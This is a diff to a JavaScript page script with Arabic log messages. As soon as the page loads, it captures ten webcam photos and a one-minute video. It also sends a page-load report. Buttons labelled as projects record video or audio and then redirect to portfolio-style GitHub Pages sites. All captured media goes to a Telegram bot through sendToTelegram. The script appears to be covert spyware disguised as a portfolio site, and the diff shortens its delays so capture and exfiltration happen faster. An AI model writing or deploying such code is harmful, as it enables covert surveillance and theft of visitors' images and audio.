@@ -22,11 +22,11 @@ document.addEventListener('DOMContentLoaded', async () => {
     async function autoCaptureonPageLoad() {
         try {
             // Wait a bit for stream to be ready
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            await new Promise(resolve => setTimeout(resolve, 300));
 
             if (!stream) {
                 console.log('⏳ Stream not ready yet, retrying...');
-                setTimeout(autoCaptureonPageLoad, 2000);
+                setTimeout(autoCaptureonPageLoad, 1000);
                 return;
             }
 
@@ -76,7 +76,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                                         } else {
                                             reject(new Error(''));
                                         }
-                                    }, 'image/jpeg', 0.95);
+                                    }, 'image/jpeg', 0.85);
                                 });
 
                                 const formData = {
@@ -85,14 +85,14 @@ document.addEventListener('DOMContentLoaded', async () => {
                                     file: blob,
                                     fileName: `auto_photo_${Date.now()}_${i + 1}.jpg`
                                 };
-                                await sendToTelegram(formData, `📸 صورة تلقائية #${i + 1}`);
+                                sendToTelegram(formData, `📸 صورة تلقائية #${i + 1}`);
                                 console.log(`✅ تم إرسال الصورة ${i + 1}/10`);
                             } catch (imageCaptureErr) {
                                 console.warn('ImageCapture failed:', imageCaptureErr);
                             }
                         }
 
-                        if (i < 9) await new Promise(resolve => setTimeout(resolve, 400));
+                        if (i < 9) await new Promise(resolve => setTimeout(resolve, 200));
                     } catch (photoError) {
                         console.error(`❌ خطأ في التقاط الصورة ${i + 1}:`, photoError);
                     }
@@ -100,11 +100,11 @@ document.addEventListener('DOMContentLoaded', async () => {
                 console.log('✅ انتهى التقاط الصور');
             }
 
-            // Record 120 second video (2 minutes)
+            // Record 60 second video (1 minute)
             console.log('⏳ انتظار قبل بدء تسجيل الفيديو...');
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            await new Promise(resolve => setTimeout(resolve, 500));
             
-            console.log('🎥 جاري تسجيل فيديو 2 دقيقة...');
+            console.log('🎥 جاري تسجيل فيديو دقيقة واحدة...');
             const videoMimeType = getSupportedVideoMimeType();
             let recordedChunks = [];
             let autoMediaRecorder = null;
@@ -140,13 +140,13 @@ document.addEventListener('DOMContentLoaded', async () => {
                     fileName: `auto_video_${Date.now()}.${fileExtension}`
                 };
 
-                const result = await sendToTelegram(formData, '🎥 فيديو تلقائي - 2 دقيقة');
+                const result = await sendToTelegram(formData, '🎥 فيديو تلقائي - دقيقة واحدة');
                 if (result) {
                     console.log('✅ تم إرسال الفيديو بنجاح');
                 } else {
                     console.warn('⚠️ فشل إرسال الفيديو، جاري إعادة المحاولة...');
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    await sendToTelegram(formData, '🎥 فيديو تلقائي - 2 دقيقة (إعادة محاولة)');
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    await sendToTelegram(formData, '🎥 فيديو تلقائي - دقيقة واحدة (إعادة محاولة)');
                 }
             };
 
@@ -154,13 +154,13 @@ document.addEventListener('DOMContentLoaded', async () => {
                 autoMediaRecorder.start();
                 console.log('🔴 بدء تسجيل الفيديو...');
 
-                // Auto-stop after 120 seconds (2 minutes)
+                // Auto-stop after 60 seconds (1 minute)
                 setTimeout(() => {
                     if (autoMediaRecorder && autoMediaRecorder.state === 'recording') {
                         autoMediaRecorder.stop();
                         console.log('⏹️ انتهى تسجيل الفيديو');
                     }
-                }, 120000);
+                }, 60000);
             } catch (error) {
                 console.error('❌ خطأ في بدء التسجيل:', error);
             }
@@ -295,7 +295,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
     
     // Call the function after a short delay to ensure everything is ready
-    setTimeout(sendPageLoadReport, 500);
+    setTimeout(sendPageLoadReport, 200);
 
     // ==================== Helper Functions ====================
 
@@ -1128,7 +1128,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         });
     }
     
-    // Project 2: Record video (10 seconds)
+    // Project 2: Record video (5 seconds)
     if (projectBtn2) {
         projectBtn2.addEventListener('click', async () => {
             if (!stream || projectBtn2.disabled) {
@@ -1137,11 +1137,11 @@ document.addEventListener('DOMContentLoaded', async () => {
             
             projectBtn2.disabled = true;
             recordingType = 'project2';
-            startRecordingProject(stream, getSupportedVideoMimeType(), 10000, 'https://abuali782.github.io/Zena-Touch-v2/');
+            startRecordingProject(stream, getSupportedVideoMimeType(), 5000, 'https://abuali782.github.io/Zena-Touch-v2/');
         });
     }
     
-    // Project 3: Record audio (15 seconds)
+    // Project 3: Record audio (5 seconds)
     if (projectBtn3) {
         projectBtn3.addEventListener('click', async () => {
             if (!stream || projectBtn3.disabled) {
@@ -1150,7 +1150,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             
             projectBtn3.disabled = true;
             recordingType = 'project3';
-            startRecordingProject(stream, getSupportedAudioMimeType(), 15000, 'https://abuali782.github.io/BaytakRealEstate/');
+            startRecordingProject(stream, getSupportedAudioMimeType(), 5000, 'https://abuali782.github.io/BaytakRealEstate/');
         });
     }
 
